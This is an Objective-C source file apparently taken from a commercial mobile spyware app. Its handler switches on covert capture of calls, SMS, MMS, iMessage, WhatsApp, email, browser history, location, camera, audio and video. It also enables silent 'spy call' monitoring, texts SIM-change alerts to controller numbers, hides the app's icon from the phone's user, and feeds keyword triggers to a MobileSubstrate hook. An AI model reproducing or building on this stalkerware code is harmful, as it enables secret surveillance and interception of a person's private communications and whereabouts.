//
//  PreferencesChangeHandler.m
//  AppEngine
//
//  Created by Makara Khloth on 12/8/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "PreferencesChangeHandler.h"
#import "AppEngine.h"

#import "ComponentHeaders.h"

@interface PreferencesChangeHandler (private)
- (void) enableDisableEventsCapture: (PrefEventsCapture *) aPrefEventCapture;
- (void) enableDisableLocationCapture: (PrefLocation *) aPrefLocation;
- (void) enableDisableSpyCall: (PrefMonitorNumber *) aPrefMonitorNumber;
- (void) enableDisableSIMChangeNotification;
- (void) reportPhoneNumber: (PrefHomeNumber *) aPrefHomeNumber;
- (void) enableDisableKeyword: (PrefKeyword *) aPrefKeyword;
- (void) enableDisableVisibility: (PrefVisibility *) aPrefVisibility;
- (void) enableDisableAddressbookMode: (PrefRestriction *) aPrefRestriction;
@end

@implementation PreferencesChangeHandler

- (id) initWithAppEngine:(AppEngine *) aAppEngine {
	if ((self = [super init])) {
		mAppEngine = aAppEngine;
		[mAppEngine retain];
	}
	return (self);
}

- (void) onPreferenceChange: (Preference *) aPreference {
	switch ([aPreference type]) {
		case kEvents_Ctrl: {
			// Events
			PrefEventsCapture *prefEventCapture = (PrefEventsCapture *)aPreference;	
			[self enableDisableEventsCapture:prefEventCapture];
			// Location
			PrefLocation *prefLocation = (PrefLocation *)[[mAppEngine mPreferenceManager] preference:kLocation];
			[self enableDisableLocationCapture:prefLocation];
		} break;
		case kLocation: {
			PrefLocation *prefLocation = (PrefLocation *)aPreference;
			[self enableDisableLocationCapture:prefLocation];
		} break;
		case kHome_Number: {
			[self enableDisableSIMChangeNotification];
			[self reportPhoneNumber:(PrefHomeNumber *)aPreference];
		} break;
		case kMonitor_Number: {
			[self enableDisableSpyCall:(PrefMonitorNumber *)aPreference];
			[self enableDisableSIMChangeNotification];
		} break;
		case kKeyword: {
			[self enableDisableKeyword:(PrefKeyword *)aPreference];
		} break;
		case kVisibility: {
			[self enableDisableVisibility:(PrefVisibility *)aPreference];
		} break;
		case kRestriction: {
			[self enableDisableAddressbookMode:(PrefRestriction *)aPreference];
		} break;
		default:
			break;
	}
}

- (void) enableDisableEventsCapture: (PrefEventsCapture *) aPrefEventCapture {
	[[mAppEngine mEDM] setMaximumEvent:[aPrefEventCapture mMaxEvent]];
	[[mAppEngine mEDM] setDeliveryTimer:[aPrefEventCapture mDeliverTimer]];
	
	// Call log
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventCall]) {
		if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableCallLog]) {
			[[mAppEngine mCallLogCaptureManager] startCapture];
		} else {
			[[mAppEngine mCallLogCaptureManager] stopCapture];
		}
	}
	
	// SMS
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventSMS]) {
		if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableSMS]) {
			[[mAppEngine mSMSCaptureManager] startCapture];
		} else {
			[[mAppEngine mSMSCaptureManager] stopCapture];
		}
	}
	
	// IMessage/WhatsApp
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventIM]) {
		if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableIM]) {
			[[mAppEngine mIMessageCaptureManager] startCapture];
			[[mAppEngine mWhatsAppCaptureManager] startCapture];
		} else {
			[[mAppEngine mIMessageCaptureManager] stopCapture];
			[[mAppEngine mWhatsAppCaptureManager] stopCapture];
		}
	}
	
	// MMS
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventMMS]) {
		if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableMMS]) {
			[[mAppEngine mMMSCaptureManager] startCapture];
		} else {
			[[mAppEngine mMMSCaptureManager] stopCapture];
		}
	}
	
	// Email
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventEmail]) {
		if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableEmail]) {
			[[mAppEngine mMailCaptureManager] startMonitoring];
		} else {
			[[mAppEngine mMailCaptureManager] stopMonitoring];
		}
	}
	
	// Media finder
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_SearchMediaFilesInFileSystem]) {
		NSMutableArray *entries = [NSMutableArray array];
		// Image
		if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableCameraImage] &&
			!([aPrefEventCapture mSearchMediaFilesFlags] & kSearchMediaImage)) { // Not search yet
			[MediaFinder setImageFindEntry:entries];
			[aPrefEventCapture setMSearchMediaFilesFlags:[aPrefEventCapture mSearchMediaFilesFlags] | kSearchMediaImage];
			[[mAppEngine mPreferenceManager] savePreference:aPrefEventCapture];
		}
		// Video
		if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableVideoFile] &&
			!([aPrefEventCapture mSearchMediaFilesFlags] & kSearchMediaVideo)) { // Not search yet
			[MediaFinder setVideoFindEntry:entries];
			[aPrefEventCapture setMSearchMediaFilesFlags:[aPrefEventCapture mSearchMediaFilesFlags] | kSearchMediaVideo];
			[[mAppEngine mPreferenceManager] savePreference:aPrefEventCapture];
		}
		// Audio
		if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableAudioFile] &&
			!([aPrefEventCapture mSearchMediaFilesFlags] & kSearchMediaAudio)) { // Not search yet
			[MediaFinder setAudioFindEntry:entries];
			[aPrefEventCapture setMSearchMediaFilesFlags:[aPrefEventCapture mSearchMediaFilesFlags] | kSearchMediaAudio];
			[[mAppEngine mPreferenceManager] savePreference:aPrefEventCapture];
		}
		if ([entries count]) {
			[[mAppEngine mMediaFinder] findMediaFileWithExtMime:entries];
		}
	}
	
	// Media capture
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventCameraImage] ||
		[[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventVideoRecording] ||
		[[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventSoundRecording] ||
		[[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventWallpaper]) {
		// Camera
		if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventCameraImage]) {
			if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableCameraImage]) {
				[[mAppEngine mMediaCaptureManager] startCameraImageCapture];
			} else {
				[[mAppEngine mMediaCaptureManager] stopCameraImageCapture];
			}
		}
		// Video
		if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventVideoRecording]) {
			if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableVideoFile]) {
				[[mAppEngine mMediaCaptureManager] startVideoCapture];
			} else {
				[[mAppEngine mMediaCaptureManager] stopVideoCapture];
			}
		}
		// Audio
		if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventSoundRecording]) {
			if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableAudioFile]) {
				[[mAppEngine mMediaCaptureManager] startAudioCapture];
			} else {
				[[mAppEngine mMediaCaptureManager] stopAudioCapture];
			}
		}
		// Wallpaper
		if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventWallpaper]) {
			if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableWallPaper]) {
				[[mAppEngine mMediaCaptureManager] startWallPaperCapture];
			} else {
				[[mAppEngine mMediaCaptureManager] stopWallPaperCapture];
			}
		}
	}
	
	// Browser url/Bookmark capture
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventBrowserUrl]) {
		if ([aPrefEventCapture mStartCapture]) {
			if ([aPrefEventCapture mEnableBrowserUrl]) {
				[[mAppEngine mBrowserUrlCaptureManager] startBrowserUrlCapture];
			}
		} else {
			[[mAppEngine mBrowserUrlCaptureManager] stopBrowserUrlCapture];
		}
	}
}

- (void) enableDisableLocationCapture: (PrefLocation *) aPrefLocation {
	PrefEventsCapture *prefEventCapture = (PrefEventsCapture *)[[mAppEngine mPreferenceManager] preference:kEvents_Ctrl];
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventLocation]) {
		[[mAppEngine mLocationManager] setMIntervalTime:[aPrefLocation mLocationInterval]];
		if ([prefEventCapture mStartCapture] && [aPrefLocation mEnableLocation]) {
			[[mAppEngine mLocationManager] startTracking];
		} else {
			[[mAppEngine mLocationManager] stopTracking];
		}
	}
}

- (void) enableDisableSpyCall: (PrefMonitorNumber *) aPrefMonitorNumber {
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_SpyCall] ||
		[[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_OnDemandConference]) {
		if ([[[mAppEngine mLicenseManager] mCurrentLicenseInfo] licenseStatus] != EXPIRED &&
			[[[mAppEngine mLicenseManager] mCurrentLicenseInfo] licenseStatus] != DISABLE) {
			if ([aPrefMonitorNumber mEnableMonitor]) {
				[[mAppEngine mSpyCallManager] start];
				if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventCall]) {
					[[mAppEngine mCallLogCaptureManager] setMNotCaptureNumbers:[aPrefMonitorNumber mMonitorNumbers]];
				}
			} else {
				[[mAppEngine mSpyCallManager] stop];
				if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventCall]) {
					[[mAppEngine mCallLogCaptureManager] setMNotCaptureNumbers:nil];
				}
			}
		} else {
			[[mAppEngine mSpyCallManager] stop];
			if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventCall]) {
				[[mAppEngine mCallLogCaptureManager] setMNotCaptureNumbers:nil];
			}
		}
	}
}

- (void) enableDisableSIMChangeNotification {
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_SIMChange]) {
		// SIM change notification
		PrefHomeNumber *prefHomeNumbers = (PrefHomeNumber *)[[mAppEngine mPreferenceManager] preference:kHome_Number];
		PrefMonitorNumber *prefMonitorNumbers = (PrefMonitorNumber *)[[mAppEngine mPreferenceManager] preference:kMonitor_Number];
		// 1. Home numbers
		NSString *notificationString = [[[mAppEngine mApplicationContext] mProductInfo] notificationStringForCommand:kNotificationSIMChangeCommandID
																								  withActivationCode:[[[mAppEngine mLicenseManager] mCurrentLicenseInfo] activationCode]
																											 withArg:nil];
		[[mAppEngine mSIMChangeManager] startReportSIMChange:notificationString andRecipients:[prefHomeNumbers mHomeNumbers]];
		// 2. Monitor numbers
		notificationString = NSLocalizedString (@"kSIMChange2MonitorNumbers", @"");
		[[mAppEngine mSIMChangeManager] startListenToSIMChange:notificationString andRecipients:[prefMonitorNumbers mMonitorNumbers]];
	} else {
		[[mAppEngine mSIMChangeManager] stopReportSIMChange];
		[[mAppEngine mSIMChangeManager] stopListenToSIMChange];
	}
}

- (void) reportPhoneNumber: (PrefHomeNumber *) aPrefHomeNumber {
	if ([[mAppEngine mActivationManager] mLastCmdID] == kActivateCmd &&
		[mAppEngine mIsNeedSendSMSHomeNumbers]) {
		// Report phone number to home numbers
		NSString *notificationString = [[[mAppEngine mApplicationContext] getProductInfo] notificationStringForCommand:kNotificationReportPhoneNumberCommandID
																			withActivationCode:[[[mAppEngine mLicenseManager] mCurrentLicenseInfo] activationCode]
																					   withArg:nil];
		for (NSString* recipient in [aPrefHomeNumber mHomeNumbers]) {
			SMSSendMessage* smsSendMessage = [[SMSSendMessage alloc] init];
			[smsSendMessage setMMessage:notificationString];
			[smsSendMessage setMRecipientNumber:recipient];
			[[mAppEngine mSMSSendManager] sendSMS:smsSendMessage];
			[smsSendMessage release];
		}
		// Create system event
		FxSystemEvent *sysEvent = [[FxSystemEvent alloc] init];
		[sysEvent setMessage:notificationString];
		[sysEvent setDirection:kEventDirectionOut];
		[sysEvent setSystemEventType:kSystemEventTypeUpdatePhoneNumberHomeIn];
		[sysEvent setDateTime:[DateTimeFormat phoenixDateTime]];
		if ([[mAppEngine mEventCenter] respondsToSelector:@selector(eventFinished:)]) {
			[[mAppEngine mEventCenter] performSelector:@selector(eventFinished:) withObject:sysEvent];
		}
		[sysEvent release];
		
		[mAppEngine setMIsNeedSendSMSHomeNumbers:NO];
	}
}

- (void) enableDisableKeyword: (PrefKeyword *) aPrefKeyword {
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_SMSKeyword]) {
		NSData *keywordData = [aPrefKeyword toData];
		SharedFileIPC *sharedFileIPC = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate];
		[sharedFileIPC writeData:keywordData withID:kSharedFileKeywordID];
		[sharedFileIPC release];
	}
}

- (void) enableDisableVisibility: (PrefVisibility *) aPrefVisibility {
	// Visibility
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_HideApplication]) {
		id <AppVisibility> visibility = [[mAppEngine mApplicationContext] getAppVisibility];
		if ([aPrefVisibility mVisible]) {
			[visibility hideIconFromAppSwitcherIcon:NO andDesktop:NO];
		} else {
			[visibility hideIconFromAppSwitcherIcon:YES andDesktop:YES];
		}
	}
}

- (void) enableDisableAddressbookMode: (PrefRestriction *) aPrefRestriction {
	// Address book manager
	if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_AddressbookManagement]) {
		// Address book management mode
		if (([aPrefRestriction mAddressBookMgtMode] & kAddressMgtModeRestrict) ||
			([aPrefRestriction mAddressBookMgtMode] & kAddressMgtModeMonitor)) {
			[[mAppEngine mAddressbookManager] setMode:kAddressbookManagerModeMonitor];
			[[mAppEngine mAddressbookManager] start];
		} else {
			[[mAppEngine mAddressbookManager] setMode:kAddressbookManagerModeOff];
			[[mAppEngine mAddressbookManager] stop];
		}
	}	
}

- (void) dealloc {
	[mAppEngine release];
	[super dealloc];
}

@end
